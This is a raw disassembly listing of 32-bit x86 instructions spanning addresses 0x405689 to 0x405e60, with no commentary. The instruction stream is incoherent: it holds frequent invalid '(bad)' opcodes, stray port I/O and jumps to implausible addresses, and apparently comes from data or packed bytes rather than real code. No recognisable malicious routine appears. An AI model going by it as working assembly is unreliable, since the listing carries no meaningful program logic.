  405689:	stos   DWORD PTR es:[edi],eax
  40568a:	pop    esi
  40568b:	cmp    DWORD PTR [eax],ebp
  40568d:	(bad)  
  40568f:	xchg   BYTE PTR [eax+0x385439e3],cl
  405695:	xchg   ebp,eax
  405696:	int    0x90
  405698:	aam    0x2c
  40569a:	lea    ebx,[ecx+eiz*8-0x1b]
  40569e:	sahf   
  40569f:	int3   
  4056a0:	jmp    0x40570d
  4056a2:	not    ah
  4056a4:	iret   
  4056a5:	cmp    eax,DWORD PTR [ecx+0x4d]
  4056a8:	das    
  4056a9:	push   eax
  4056aa:	dec    ebp
  4056ab:	add    cl,BYTE PTR [esi+eax*1]
  4056ae:	dec    ebp
  4056af:	adc    eax,0xd9db0867
  4056b4:	push   cs
  4056b5:	add    BYTE PTR [edi],cl
  4056b7:	sbb    bl,ah
  4056b9:	xchg   esp,eax
  4056ba:	repnz adc BYTE PTR [edi+0x380817f8],bh
  4056c1:	jnp    0x40564d
  4056c3:	dec    eax
  4056c4:	(bad)  
  4056c5:	push   cs
  4056c6:	sub    ebx,ecx
  4056c8:	lahf   
  4056c9:	mov    eax,ds:0xc3448a9d
  4056ce:	ja     0x4056bb
  4056d0:	or     al,0x55
  4056d2:	mov    eax,0x8e69150
  4056d7:	ja     0x405744
  4056d9:	pushf  
  4056da:	sbb    ecx,DWORD PTR [ebp-0x7439966b]
  4056e0:	lea    esp,[ecx-0x6f]
  4056e3:	jne    0x4056a4
  4056e5:	loope  0x4056b8
  4056e7:	stos   DWORD PTR es:[edi],eax
  4056e8:	or     BYTE PTR [edi-0x91f48bd],bh
  4056ee:	xchg   BYTE PTR [esi-0xb7f6a8f],bh
  4056f4:	xor    eax,0x91710104
  4056f9:	neg    DWORD PTR [edi]
  4056fb:	adc    al,0xf8
  4056fd:	outs   dx,DWORD PTR ds:[esi]
  4056fe:	loope  0x4056a9
  405700:	(bad)  
  405702:	fdivr  DWORD PTR [edi-0x71]
  405705:	je     0x4056f4
  405707:	mov    DWORD PTR [edi],ebx
  405709:	jecxz  0x40570d
  40570b:	xchg   BYTE PTR [edx-0x31],cl
  40570e:	hlt    
  40570f:	adc    DWORD PTR [eax-0x75d74bb],edi
  405715:	jbe    0x40570e
  405717:	dec    ebp
  405718:	(bad)  
  405719:	pop    eax
  40571a:	sbb    al,0xc0
  40571c:	sub    esi,ebp
  40571e:	dec    ecx
  40571f:	sbb    BYTE PTR [ecx+0x1b8b4c64],al
  405725:	xor    esi,esi
  405727:	sbb    BYTE PTR [edx-0x40],0x26
  40572b:	xchg   BYTE PTR [edx-0x57233ffd],cl
  405731:	sub    eax,DWORD PTR [ecx+0x1f54188d]
  405737:	fsubp  st(2),st
  405739:	xor    BYTE PTR [esi+0x6f],ah
  40573c:	psrld  mm7,QWORD PTR [edx-0x38470fe8]
  405743:	adc    DWORD PTR [edx-0x2ffbcfbc],ecx
  405749:	sub    al,0xa
  40574b:	cld    
  40574c:	xchg   edx,eax
  40574d:	mov    dh,0xd2
  40574f:	jae    0x405758
  405751:	jmp    0x4057c5
  405753:	int    0x72
  405755:	sbb    BYTE PTR [esi+0x63],bh
  405758:	sub    ecx,DWORD PTR [edx+0x20]
  40575b:	idiv   BYTE PTR [ebx-0x45e03dd6]
  405761:	mov    al,ds:0x288a656
  405766:	(bad)  
  405767:	sbb    BYTE PTR [edx-0x77],bl
  40576a:	and    BYTE PTR [eax],0x1d
  40576d:	mov    edx,0xf7ecde30
  405772:	and    eax,0x4f954695
  405777:	enter  0xb01b,0xc9
  40577b:	or     DWORD PTR [edi-0x67],ecx
  40577e:	xchg   edx,eax
  40577f:	xor    ah,BYTE PTR [edi]
  405781:	loope  0x405763
  405783:	sbb    bh,cl
  405785:	(bad)  
  405786:	nop
  405787:	inc    ebx
  405788:	test   BYTE PTR [ecx],ch
  40578a:	push   ecx
  40578b:	mov    WORD PTR ds:0xa5161a0b,es
  405791:	pop    edx
  405792:	adc    BYTE PTR [edi-0x74],cl
  405795:	mov    WORD PTR [edx],gs
  405797:	sub    ebx,DWORD PTR [eax-0x58]
  40579a:	add    al,0xfc
  40579c:	es jp  0x4057e0
  40579f:	add    DWORD PTR [esi],eax
  4057a1:	mov    bl,0x1
  4057a3:	and    eax,0x72792110
  4057a8:	mov    al,ds:0x58a82c92
  4057ad:	dec    ebx
  4057ae:	or     BYTE PTR [edi+0x17],bl
  4057b1:	push   ecx
  4057b2:	mov    BYTE PTR [ecx],bh
  4057b4:	lock out 0x30,al
  4057b7:	or     al,0x77
  4057b9:	sub    BYTE PTR [edi],bh
  4057bb:	fcomp  QWORD PTR [ebx+0x682e1007]
  4057c1:	sbb    BYTE PTR [edi+eax*1],0xe4
  4057c5:	push   es
  4057c6:	(bad)  
  4057c7:	cmp    al,dl
  4057c9:	pop    eax
  4057ca:	rcl    BYTE PTR ds:0x7ff04e0,0x0
  4057d1:	jp     0x4057e3
  4057d3:	outs   dx,DWORD PTR ds:[esi]
  4057d4:	test   BYTE PTR [edi+0x62],bl
  4057d7:	mov    edi,0x5b372913
  4057dc:	(bad)  
  4057dd:	fild   WORD PTR [esi+edi*1-0x1]
  4057e1:	and    al,0xdf
  4057e3:	sub    al,0x44
  4057e5:	je     0x405801
  4057e7:	dec    al
  4057e9:	je     0x4057f5
  4057eb:	sub    al,0xb6
  4057ed:	sub    al,0xc
  4057ef:	je     0x405817
  4057f1:	mov    dl,0xf7
  4057f3:	inc    ebp
  4057f4:	or     BYTE PTR [eax],dl
  4057f6:	mov    bl,0x2
  4057f8:	jmp    0x405814
  4057fa:	push   es
  4057fb:	push   ss
  4057fc:	push   eax
  4057fd:	and    BYTE PTR [esi+0x2e],dh
  405800:	loop   0x40583f
  405802:	in     al,dx
  405803:	jmp    0x405813
  405805:	inc    edi
  405806:	mov    cl,0xf8
  405808:	jle    0x4057d6
  40580a:	fadd   st(3),st
  40580c:	aas    
  40580d:	jb     0x4057ac
  40580f:	xchg   esi,eax
  405810:	(bad)  
  405811:	pop    ebp
  405812:	push   eax
  405813:	add    edx,ebp
  405815:	out    0xa7,eax
  405817:	sti    
  405818:	pusha  
  405819:	add    DWORD PTR ds:0x464138b,ecx
  40581f:	push   0x45c40389
  405824:	div    BYTE PTR [eax+0x7c037f03]
  40582a:	or     al,0x5b
  40582c:	pop    ss
  40582d:	xor    al,0x12
  40582f:	jle    0x40588d
  405831:	(bad)  
  405832:	push   ebp
  405833:	push   ecx
  405834:	mov    ebp,eax
  405836:	sbb    edi,DWORD PTR [edi+0x47d7ee10]
  40583c:	mov    ds:0xbed448bb,al
  405841:	or     BYTE PTR fs:[esi],bh
  405844:	jnp    0x40580c
  405846:	(bad)  
  405847:	jbe    0x405872
  405849:	mov    eax,ebp
  40584b:	(bad)  
  40584d:	cvtps2pd xmm2,QWORD PTR [esp+edx*8+0x29]
  405852:	mov    al,ds:0xfefc9ede
  405857:	leave  
  405858:	cmp    dl,BYTE PTR [edx]
  40585a:	jle    0x405865
  40585c:	pushf  
  40585d:	ret    
  40585e:	add    al,0x4f
  405860:	jne    0x405834
  405862:	sub    BYTE PTR [edi],dh
  405864:	xor    eax,0xd32f5612
  405869:	inc    DWORD PTR [eax+0x7f]
  40586c:	cmp    DWORD PTR [di],0x4
  405870:	adc    dh,BYTE PTR [ebp+0x3a]
  405873:	cmp    ebx,0x63
  405876:	jg     0x40589c
  405878:	popf   
  405879:	fistp  WORD PTR [ebx+0x38]
  40587c:	test   eax,0x995f643c
  405881:	xor    eax,edx
  405883:	sub    eax,edx
  405885:	inc    ebx
  405886:	scas   eax,DWORD PTR es:[edi]
  405887:	sub    al,0xd4
  405889:	add    ecx,eax
  40588b:	add    ah,BYTE PTR [eax+eax*1+0x6b]
  40588f:	shl    BYTE PTR [ebx+eax*1+0x6c],0xa7
  405894:	jg     0x405895
  405896:	jle    0x40581b
  405898:	js     0x405896
  40589a:	add    BYTE PTR [esi+0xe],bh
  40589d:	adc    bh,dh
  40589f:	pop    eax
  4058a0:	cld    
  4058a1:	jmp    0x4058a9
  4058a3:	in     eax,0x48
  4058a5:	cld    
  4058a6:	gs jbe 0x405870
  4058a9:	jno    0x405893
  4058ab:	add    eax,ebx
  4058ad:	(bad)  
  4058af:	psubusb mm0,QWORD PTR [ebx+edi*4]
  4058b3:	xor    DWORD PTR [edx-0x66],ebp
  4058b6:	fsubr  st(0),st
  4058b8:	in     al,0x52
  4058ba:	xor    eax,DWORD PTR [edx+0x43c71a2a]
  4058c0:	xchg   edi,eax
  4058c1:	and    DWORD PTR [edi+eax*8],ebx
  4058c4:	or     eax,esp
  4058c6:	xor    BYTE PTR [edi-0x13f5ffd6],ch
  4058cc:	test   al,0x5a
  4058ce:	sbb    DWORD PTR [edi],0x9f911802
  4058d4:	and    al,0x88
  4058d7:	inc    ebp
  4058d8:	idiv   BYTE PTR [edx-0x41]
  4058db:	or     bl,BYTE PTR [ebx+eax*2+0x3ed18452]
  4058e2:	xor    eax,0xae14a748
  4058e7:	loopne 0x405950
  4058e9:	jne    0x40591f
  4058eb:	stc    
  4058ec:	sub    DWORD PTR [ebx*8+0x7ef889ae],0xffffff8b
  4058f4:	or     ecx,DWORD PTR [ecx-0x45]
  4058f7:	mov    esp,DWORD PTR [ecx*4-0x24521bab]
  4058fe:	cdq    
  4058ff:	dec    esi
  405900:	push   0x5c
  405902:	jae    0xc3eae17c
  405908:	in     eax,dx
  405909:	stos   BYTE PTR es:[edi],al
  40590a:	pop    eax
  40590b:	adc    eax,0xfe5cb87d
  405910:	sti    
  405911:	call   0x565d4661
  405916:	xor    BYTE PTR [eax],cl
  405918:	mov    eax,ds:0xeb8c3a91
  40591d:	mov    ebp,0xe6adf42a
  405922:	hlt    
  405923:	lods   eax,DWORD PTR ds:[esi]
  405924:	or     DWORD PTR [eax+0x6e317e84],0xb00cfca9
  40592e:	and    BYTE PTR [edx-0x7dd208f3],cl
  405934:	test   al,0x1a
  405936:	nop
  405937:	add    edi,DWORD PTR [ecx-0x26]
  40593a:	pop    esp
  40593b:	jmp    0x272a:0x790302f2
  405942:	into   
  405943:	add    cl,ch
  405945:	lock mov ds:0xd3834de3,eax
  40594b:	bound  eax,QWORD PTR [esi+0x72012cf6]
  405951:	mov    dl,0x22
  405953:	sub    ch,BYTE PTR [eax+0x5d]
  405956:	clc    
  405957:	ret    0xeb3a
  40595a:	push   edx
  40595b:	lods   al,BYTE PTR ds:[esi]
  40595c:	lock and al,0xe9
  40595f:	in     al,dx
  405960:	call   0x8582366c
  405965:	push   ss
  405966:	hlt    
  405967:	cmp    al,0xe
  405969:	arpl   WORD PTR [ecx-0x1493e364],di
  40596f:	ss aaa 
  405971:	repnz hlt 
  405973:	sbb    bl,BYTE PTR [eax-0x67]
  405976:	nop
  405977:	out    0xf4,al
  405979:	jmp    0x40596b
  40597b:	cmp    DWORD PTR [ebp-0x40],0xe
  40597f:	cs mov ah,0x5d
  405982:	push   ebp
  405983:	dec    BYTE PTR ds:0x508159c8
  405989:	cld    
  40598a:	aad    0xf2
  40598c:	jo     0x40590e
  40598e:	jge    0x405978
  405990:	add    dh,BYTE PTR [edi+0x6a]
  405993:	fist   WORD PTR [edi+edx*1]
  405996:	dec    ebp
  405997:	add    esp,edx
  405999:	shr    BYTE PTR [ebx],1
  40599b:	(bad)  
  40599c:	push   ecx
  40599d:	fst    DWORD PTR ds:0x5938b5cb
  4059a3:	data16 fmul QWORD PTR [edx-0x1e]
  4059a7:	cmp    eax,0xdbfdbdec
  4059ac:	aaa    
  4059ad:	add    BYTE PTR [esi+0x50],dh
  4059b0:	(bad)  
  4059b1:	cmp    ecx,eax
  4059b3:	jle    0x4059ea
  4059b5:	and    bh,al
  4059b7:	fs jmp 0x4059e9
  4059ba:	jne    0x40594e
  4059bc:	popa   
  4059bd:	or     ebx,DWORD PTR [eax+ebx*8]
  4059c0:	mov    ?,esi
  4059c2:	add    eax,ecx
  4059c4:	or     esi,ebx
  4059c6:	lds    edx,FWORD PTR [eax]
  4059c8:	or     cl,BYTE PTR [esi+edi*1+0x77]
  4059cc:	daa    
  4059cd:	xor    al,0x3
  4059cf:	sbb    BYTE PTR [esi+0x67506409],al
  4059d5:	xchg   ecx,eax
  4059d6:	sub    ecx,DWORD PTR [edi+ecx*1-0x37]
  4059da:	mov    bl,0x37
  4059dc:	push   0xd2798436
  4059e1:	xor    esp,ecx
  4059e3:	jle    0x405980
  4059e5:	imul   ecx,DWORD PTR [edx+0x146af400],0xffffff9f
  4059ec:	and    edx,DWORD PTR [edx]
  4059ee:	jmp    0xb14ee1d9
  4059f3:	fwait
  4059f4:	int    0xc4
  4059f6:	jne    0x405a01
  4059f8:	cmp    BYTE PTR [eax+eiz*1+0x75],0xea
  4059fd:	shr    DWORD PTR [ebp+0x39b4c542],0x54
  405a04:	add    ah,bl
  405a06:	jmp    FWORD PTR [ebp-0x41]
  405a09:	scas   al,BYTE PTR es:[edi]
  405a0a:	jb     0x4059e7
  405a0c:	add    ebx,ecx
  405a0e:	fsubr  QWORD PTR [edi]
  405a10:	add    esp,DWORD PTR [ecx+ebp*2+0x2a74df7f]
  405a17:	push   edx
  405a18:	fcom   DWORD PTR [ebx+eax*4-0x2749fed0]
  405a1f:	das    
  405a20:	xor    eax,DWORD PTR [edx+eiz*1-0x563f0ff1]
  405a27:	xchg   esp,eax
  405a28:	repnz push ebp
  405a2a:	out    dx,al
  405a2b:	dec    ebx
  405a2c:	jb     0x4059cd
  405a2e:	ret    
  405a2f:	or     DWORD PTR [edx-0x608fd2c],0xbad8974a
  405a39:	bound  ebx,QWORD PTR [eax]
  405a3b:	mov    al,0x90
  405a3d:	add    al,0x71
  405a3f:	ret    
  405a40:	pop    ss
  405a41:	adc    dh,ah
  405a43:	and    bl,bh
  405a45:	outs   dx,DWORD PTR gs:[esi]
  405a47:	add    BYTE PTR fs:[ecx],ah
  405a4a:	xchg   esi,eax
  405a4b:	pusha  
  405a4c:	add    bh,dl
  405a4e:	push   es
  405a4f:	fcom   QWORD PTR [eax]
  405a51:	ret    0x3584
  405a54:	or     edi,0xffffffff
  405a57:	push   0x66
  405a59:	loope  0x405a86
  405a5b:	or     DWORD PTR ds:0x1c82dd4f,0x4c
  405a62:	sbb    ebp,DWORD PTR [eax+0x2412b7b4]
  405a68:	mov    ecx,0x23409950
  405a6d:	es (bad) 
  405a6f:	jmp    0x405a7f
  405a71:	in     al,0x48
  405a73:	mov    edx,0x5c94512a
  405a78:	add    eax,0x31361da0
  405a7d:	pop    esi
  405a7e:	add    BYTE PTR [ebp-0x3aa59701],al
  405a84:	adc    BYTE PTR [edx],bl
  405a86:	and    al,0x5c
  405a88:	pop    ss
  405a89:	inc    eax
  405a8a:	push   eax
  405a8b:	push   esi
  405a8c:	pop    ds
  405a8d:	ins    DWORD PTR es:[edi],dx
  405a8e:	inc    esi
  405a8f:	mul    DWORD PTR [ebx]
  405a91:	inc    edi
  405a92:	inc    ebp
  405a93:	add    DWORD PTR [ecx],edi
  405a95:	aaa    
  405a96:	xor    esi,DWORD PTR [edx]
  405a98:	imul   esi,DWORD PTR [esi+eax*1],0xd
  405a9c:	or     BYTE PTR [edx],cl
  405a9e:	retf   0xd8a
  405aa1:	mov    WORD PTR [eax],fs
  405aa3:	ret    
  405aa4:	fisub  WORD PTR [ecx]
  405aa6:	test   al,0xa6
  405aa8:	je     0x405a2d
  405aaa:	or     dh,BYTE PTR [edx]
  405aac:	enter  0x7b00,0x3
  405ab0:	add    DWORD PTR [ecx+0x47],ebx
  405ab3:	or     al,0x39
  405ab5:	nop
  405ab6:	xchg   ecx,eax
  405ab7:	pop    es
  405ab8:	(bad)  
  405ab9:	add    BYTE PTR [edi+0x1a],bh
  405abc:	jmp    0x85a9:0xe0640e0
  405ac3:	ret    0x6203
  405ac6:	xor    BYTE PTR [eax+0x33],dh
  405ac9:	and    al,0x66
  405acb:	sbb    al,0xf9
  405acd:	fist   DWORD PTR [ecx]
  405acf:	inc    ebx
  405ad0:	je     0x405b18
  405ad2:	(bad)  
  405ad4:	ja     0x405b14
  405ad6:	jne    0x405adf
  405ad8:	xor    DWORD PTR [esi+0x40f3a7b],eax
  405ade:	add    DWORD PTR [ebx+edi*2],ebx
  405ae1:	push   ds
  405ae2:	pop    edi
  405ae3:	(bad)  
  405ae4:	rol    DWORD PTR [edx+ebp*1],0xe0
  405ae8:	add    al,0x22
  405aea:	stos   DWORD PTR es:[edi],eax
  405aeb:	adc    edi,DWORD PTR [ecx+ecx*1]
  405aee:	push   eax
  405aef:	add    al,0x54
  405af1:	pop    edx
  405af2:	sub    DWORD PTR [ebp*1+0x1e7c0561],ecx
  405af9:	int3   
  405afa:	mov    fs,esi
  405afc:	ret    0xda5d
  405aff:	or     DWORD PTR [edi-0x77e825bf],eax
  405b05:	pushf  
  405b06:	les    ebx,FWORD PTR [ecx]
  405b08:	push   eax
  405b09:	xlat   BYTE PTR ds:[ebx]
  405b0a:	pushf  
  405b0b:	les    eax,FWORD PTR [ebx]
  405b0d:	test   al,0xa2
  405b0f:	xchg   ebx,eax
  405b10:	into   
  405b11:	jmp    0xe114a25c
  405b16:	xchg   DWORD PTR [eax+0x2a],ebp
  405b19:	out    dx,eax
  405b1a:	xchg   edx,eax
  405b1b:	adc    DWORD PTR [esi+0x7c38d082],esp
  405b21:	lods   eax,DWORD PTR ds:[esi]
  405b22:	pop    edx
  405b23:	pop    edi
  405b24:	shl    dh,0x8
  405b27:	sub    eax,0xb3cce8ac
  405b2c:	add    DWORD PTR [ecx+0x5d],esi
  405b2f:	cmp    al,0x92
  405b31:	pusha  
  405b32:	pop    esi
  405b33:	in     eax,dx
  405b34:	adc    al,0x99
  405b36:	aaa    
  405b37:	jnp    0x405b08
  405b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b3a:	mov    dh,al
  405b3c:	test   BYTE PTR [ebx*1+0x381e8915],ah
  405b43:	cmp    BYTE PTR [ebx],dl
  405b45:	jbe    0x405ada
  405b47:	adc    bl,al
  405b49:	jne    0x405b58
  405b4b:	dec    ebx
  405b4c:	mov    DWORD PTR [esp+0x7e],ebx
  405b50:	mov    cl,0xc0
  405b52:	jb     0x405b7b
  405b54:	fst    st(4)
  405b56:	fcomp  DWORD PTR ds:0xfdf29a1c
  405b5c:	jmp    0x405b14
  405b5e:	fbstp  TBYTE PTR [edx+0xd]
  405b61:	sbb    eax,0x1fddaadc
  405b66:	fwait
  405b67:	jmp    0x405b74
  405b69:	sbb    DWORD PTR [ebx+eax*4+0x2b],esp
  405b6d:	mov    ds:0x7d18a9c1,al
  405b72:	jle    0x405b6a
  405b74:	push   edx
  405b75:	aaa    
  405b76:	les    eax,FWORD PTR [ecx+0x6adaddc4]
  405b7c:	add    BYTE PTR [edi+0x54],cl
  405b7f:	dec    esi
  405b80:	clc    
  405b81:	rol    dl,cl
  405b83:	mov    al,0x52
  405b85:	push   ss
  405b86:	xchg   ebx,eax
  405b87:	xor    dh,BYTE PTR [eax]
  405b89:	jmp    0x405b8c
  405b8b:	loopne 0x405b83
  405b8d:	dec    DWORD PTR [ecx]
  405b8f:	sbb    BYTE PTR [esi],cl
  405b91:	mov    dl,BYTE PTR [esp+eax*1-0x1]
  405b95:	sub    dl,0x21
  405b98:	jb     0x405b8c
  405b9a:	or     BYTE PTR ds:0x2e4bed74,cl
  405ba0:	adc    esi,ecx
  405ba2:	or     al,0xcb
  405ba4:	xchg   ecx,eax
  405ba5:	sti    
  405ba6:	jno    0x405b5e
  405ba8:	and    eax,0x9b075d91
  405bad:	icebp  
  405bae:	pop    ebp
  405baf:	or     BYTE PTR [ecx+0x7002a1de],ah
  405bb5:	lea    eax,[eax]
  405bb7:	pop    ss
  405bb8:	dec    edx
  405bb9:	js     0x405b49
  405bbb:	adc    dl,BYTE PTR [edx]
  405bbd:	enter  0xa508,0x82
  405bc1:	(bad)  
  405bc2:	das    
  405bc3:	add    ecx,DWORD PTR [edx]
  405bc5:	jmp    0x405c24
  405bc7:	(bad)  
  405bc8:	dec    ebp
  405bc9:	and    esi,DWORD PTR [ecx]
  405bcb:	es loopne 0x405bfa
  405bce:	cld    
  405bcf:	pop    ds
  405bd0:	jg     0x405bde
  405bd2:	xor    esp,ebp
  405bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd5:	fprem  
  405bd7:	push   0x2
  405bd9:	push   ds
  405bda:	add    DWORD PTR ds:0x604182a4,0x1df9960c
  405be4:	(bad)  
  405be5:	dec    edx
  405be6:	sub    DWORD PTR [edi+0x8b79e82],eax
  405bec:	push   ebp
  405bed:	(bad)  
  405bee:	call   0x33ec6ce7
  405bf3:	leave  
  405bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bf5:	adc    al,0x70
  405bf7:	xor    cl,ah
  405bf9:	mov    ch,BYTE PTR [eax-0x26]
  405bfc:	dec    esp
  405bfd:	adc    al,0x20
  405bff:	xor    BYTE PTR [eax+0x68],0x16
  405c03:	data16 mov al,0x52
  405c06:	xor    BYTE PTR [edi+0x6b],cl
  405c09:	pop    edi
  405c0a:	dec    esp
  405c0b:	call   0x8401:0x51bdc23c
  405c12:	(bad)  
  405c13:	das    
  405c14:	pushf  
  405c15:	push   ds
  405c16:	xchg   BYTE PTR [ebx],al
  405c18:	(bad)  
  405c19:	xor    eax,eax
  405c1b:	mov    ebp,0xd2077e22
  405c20:	mov    esi,0x8d042a0
  405c25:	push   ebp
  405c26:	push   0xb
  405c28:	aaa    
  405c29:	or     ch,BYTE PTR [esi]
  405c2b:	cld    
  405c2c:	mov    bh,BYTE PTR [ecx-0x7261df84]
  405c32:	inc    ebx
  405c33:	inc    esp
  405c34:	xchg   edi,eax
  405c35:	add    BYTE PTR [ecx-0x45],0x48
  405c39:	retf   
  405c3a:	fcomp  QWORD PTR [ecx-0x42]
  405c3d:	pop    es
  405c3e:	inc    ebx
  405c3f:	push   es
  405c40:	imul   edi,DWORD PTR [esi-0x530fba04],0xc0098238
  405c4a:	in     eax,0xf0
  405c4c:	mov    eax,edi
  405c4e:	inc    ebx
  405c4f:	push   edx
  405c50:	fidivr DWORD PTR ds:0xfbc0bf67
  405c56:	or     eax,0xc1ae75
  405c5b:	addr16 sbb al,0x8
  405c5e:	pop    esp
  405c5f:	add    eax,0x22c05cd
  405c64:	pop    es
  405c65:	push   cs
  405c66:	xchg   esi,eax
  405c67:	push   es
  405c68:	add    DWORD PTR [ecx],esp
  405c6a:	shl    BYTE PTR [esp+ebp*8],cl
  405c6d:	fsubr  st(6),st
  405c6f:	fwait
  405c70:	or     al,0xfb
  405c72:	mov    es,eax
  405c74:	xor    ecx,esp
  405c76:	in     al,dx
  405c77:	dec    ecx
  405c78:	call   0x932c8ec0
  405c7d:	clc    
  405c7e:	sub    ah,ch
  405c80:	call   0x240ad88d
  405c85:	shl    BYTE PTR [ebp-0x64],0xd7
  405c89:	ss pushf 
  405c8b:	ds nop
  405c8d:	fisubr WORD PTR [edx]
  405c8f:	add    BYTE PTR [ecx],al
  405c91:	shr    WORD PTR [edi],1
  405c94:	fucomi st,st(5)
  405c96:	xchg   ebx,eax
  405c97:	icebp  
  405c98:	xor    esi,esi
  405c9a:	retf   
  405c9b:	push   es
  405c9c:	jl     0x405ca5
  405c9e:	je     0x405cbf
  405ca0:	xchg   esp,eax
  405ca1:	cmp    al,0x9d
  405ca3:	cmp    cl,dh
  405ca5:	fiadd  WORD PTR [ebx]
  405ca7:	add    eax,0x48df075
  405cac:	adc    ecx,esi
  405cae:	popa   
  405caf:	push   edi
  405cb0:	push   0x9bbe5900
  405cb5:	js     0x405ca0
  405cb7:	nop
  405cb8:	or     DWORD PTR [edx-0x79],0x77
  405cbc:	mov    cl,0xe1
  405cbe:	cmp    al,0x95
  405cc0:	or     DWORD PTR ds:0xff602c97,0x33
  405cc7:	push   ss
  405cc8:	fnclex 
  405cca:	inc    esi
  405ccb:	(bad)  
  405ccc:	pop    esp
  405ccd:	mov    ch,0x87
  405ccf:	pop    edx
  405cd0:	out    dx,eax
  405cd1:	mov    ebp,0x489d85e
  405cd6:	cmp    eax,0x9ce8d5b1
  405cdb:	mov    edx,0xeb246ea8
  405ce0:	pop    ecx
  405ce1:	pop    es
  405ce2:	push   ecx
  405ce3:	mov    ch,BYTE PTR [eax-0x62741221]
  405ce9:	pop    ebp
  405cea:	add    ebx,DWORD PTR [edi]
  405cec:	es loopne 0x405cea
  405cef:	test   al,0xb9
  405cf1:	mov    al,ds:0x600bba26
  405cf6:	cmp    eax,0x740b6197
  405cfb:	aam    0x2d
  405cfd:	fimul  DWORD PTR [esi]
  405cff:	loopne 0x405cce
  405d01:	rol    BYTE PTR [esi-0x7d7c028a],0x3c
  405d08:	push   0x4
  405d0a:	push   esi
  405d0b:	pop    edx
  405d0c:	in     al,dx
  405d0d:	out    dx,al
  405d0e:	add    edi,DWORD PTR [ebx]
  405d10:	push   0x2815dc40
  405d15:	mov    edx,0xc20db831
  405d1a:	xlat   BYTE PTR ds:[ebx]
  405d1b:	pop    ss
  405d1c:	repnz mov DWORD PTR [edi],0x4004aaa
  405d23:	sbb    esi,esi
  405d25:	jne    0x405d1b
  405d27:	push   0x3
  405d29:	push   ecx
  405d2a:	jl     0x405cb4
  405d2c:	xchg   ecx,eax
  405d2d:	xchg   edx,eax
  405d2e:	inc    ebx
  405d2f:	sub    DWORD PTR [edx+0x3229d89d],edx
  405d35:	(bad)  
  405d36:	pusha  
  405d37:	xor    DWORD PTR [bx],ecx
  405d3a:	sub    BYTE PTR [eax+edx*4+0x1b],0x8b
  405d3f:	jne    0x405daf
  405d41:	lahf   
  405d42:	adc    al,0x64
  405d44:	es push ds
  405d46:	pop    edi
  405d47:	push   ebp
  405d48:	mov    eax,?
  405d4a:	dec    ecx
  405d4b:	es jns 0x405cec
  405d4e:	test   BYTE PTR [edi+0x8a6f809],bl
  405d54:	clc    
  405d55:	add    al,0x85
  405d57:	jb     0xc9f5ea1
  405d5d:	xlat   BYTE PTR ds:[ebx]
  405d5e:	add    bh,BYTE PTR [edx*8+0x11e6f32a]
  405d65:	mov    dl,0xa9
  405d67:	inc    esi
  405d68:	(bad)  
  405d69:	push   DWORD PTR ds:0x448a23eb
  405d6f:	push   ds
  405d70:	jmp    FWORD PTR [edi+eax*2]
  405d73:	je     0x405d8f
  405d75:	sub    al,0x20
  405d77:	je     0x405d8f
  405d79:	scas   al,BYTE PTR es:[edi]
  405d7a:	ret    0xc6bd
  405d7d:	test   al,0x85
  405d7f:	sbb    al,0x1
  405d81:	nop
  405d82:	call   0x238:0x13f64c81
  405d89:	cdq    
  405d8a:	jle    0x405d42
  405d8c:	(bad)  
  405d8d:	dec    edi
  405d8e:	cs pusha 
  405d90:	(bad)  
  405d91:	mov    ebp,0x801b5755
  405d96:	dec    ecx
  405d97:	or     ebp,DWORD PTR ds:0x8b2ef971
  405d9d:	shr    DWORD PTR [ebx+edi*1],cl
  405da0:	lock jnp 0x405dbe
  405da3:	sub    bh,BYTE PTR [ecx+esi*8+0x17]
  405da7:	lock lods eax,DWORD PTR ds:[esi]
  405da9:	add    ebx,DWORD PTR [ebp+0x7f]
  405dac:	dec    ecx
  405dad:	out    0x3b,eax
  405daf:	clc    
  405db0:	inc    eax
  405db1:	mov    edx,0x888d8c88
  405db6:	mov    ecx,0x6e09f602
  405dbb:	mov    ebx,0xba4a0fdd
  405dc0:	xchg   esp,eax
  405dc1:	xor    BYTE PTR [ebx],al
  405dc3:	jmp    0x405e43
  405dc5:	mov    edx,0x79074b98
  405dca:	sbb    DWORD PTR cs:[ecx+edx*1],eax
  405dce:	test   al,0x83
  405dd0:	ret    
  405dd1:	xor    cl,cl
  405dd3:	adc    bl,bh
  405dd5:	add    ebp,ebx
  405dd7:	push   esi
  405dd8:	mov    edx,0x30bc9bb0
  405ddd:	sbb    ah,ah
  405ddf:	ins    DWORD PTR es:[edi],dx
  405de0:	jle    0x405dcb
  405de2:	pop    ecx
  405de3:	je     0x405de9
  405de5:	jne    0x405df5
  405de7:	xor    al,0xc8
  405de9:	jmp    0x405ddb
  405deb:	dec    eax
  405dec:	cs jns 0x405df3
  405def:	in     al,dx
  405df0:	in     al,dx
  405df1:	jle    0x6f1166a
  405df7:	fs push ebp
  405df9:	jne    0x405d9a
  405dfb:	dec    esp
  405dfc:	pop    esp
  405dfd:	sbb    cl,cl
  405dff:	in     al,dx
  405e00:	dec    edi
  405e01:	xor    esp,ebx
  405e03:	pop    ebp
  405e04:	enter  0xe704,0x57
  405e08:	sbb    BYTE PTR [bp+di-0x27f8],bh
  405e0d:	add    edi,edi
  405e0f:	pop    ds
  405e10:	gs add al,ah
  405e13:	jbe    0x405dd5
  405e15:	mov    ecx,0x23bf2b1f
  405e1a:	adc    BYTE PTR [edi],al
  405e1c:	(bad)  
  405e1d:	mov    edx,0x552da2d7
  405e22:	pop    ebx
  405e23:	xlat   BYTE PTR ds:[ebx]
  405e24:	js     0x405e9c
  405e26:	pop    edi
  405e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e28:	sti    
  405e29:	add    BYTE PTR [eax],ah
  405e2b:	adc    al,0x82
  405e2d:	cmp    BYTE PTR ds:0x5c04c8fe,dh
  405e33:	mov    WORD PTR [ebp+0x1dc6fccc],es
  405e39:	clc    
  405e3a:	cmp    DWORD PTR [ebp-0x29632924],0x755b18ee
  405e44:	sbb    al,0x37
  405e46:	jmp    0x85db:0x9edce87b
  405e4d:	ror    BYTE PTR [ecx+0x47],1
  405e50:	cmp    BYTE PTR [eax],0x23
  405e53:	aaa    
  405e54:	and    BYTE PTR [ebx],dh
  405e56:	mov    ds:0xc1359d02,al
  405e5b:	mov    ebp,0x8fe7f84a
  405e60:	enter  0xebc6,0x9
